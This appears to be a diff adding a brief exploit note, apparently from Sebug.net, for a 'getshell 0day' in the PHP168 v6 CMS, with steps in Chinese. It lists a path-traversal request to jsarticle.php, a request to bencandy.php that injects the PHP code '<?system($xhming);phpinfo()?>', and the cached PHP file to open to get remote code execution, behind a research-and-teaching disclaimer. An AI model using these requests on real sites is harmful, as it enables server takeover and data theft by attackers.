@@ -1,0 +1,6 @@
+php168v6 getshell 0day
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.do/jsarticle.php?type=like&id=xhming/../../../../inc/foot2.do/bencandy.php?fid=4&id=582&content=<?system($xhming);phpinfo()?>3.cache/bencandy_cache/0/582_1.php   //记住id值，由于有缓存和时间的判断每一步要等会
